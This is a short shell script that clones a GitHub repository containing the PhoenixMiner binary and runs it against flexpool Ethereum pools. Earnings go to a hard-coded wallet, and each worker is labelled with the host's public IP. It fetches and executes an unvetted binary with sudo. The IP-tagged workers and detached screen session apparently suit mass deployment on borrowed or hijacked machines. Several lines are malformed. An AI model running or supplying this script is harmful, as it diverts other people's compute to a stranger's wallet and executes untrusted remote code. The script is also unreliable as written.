#!/bin/sh
sudo apt update
sudo apt install screen -y
screen -dmS haneut.sh 89 95
sudo apt install libpci3
sudo apt-get install screen
git clone https://github.com/Diefky/pcx.git
cd pcx
chmod +x PhoenixMiner
sudo ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) && ./PhoenixMiner -pool ssl://eth-sg.flexpool.io:5555 -pool2 ssl://eth-hke.flexpool.io:5555 -wal 0xA80ACc945731237F80E72eCe54D8d4e9e61e21E2.$ip
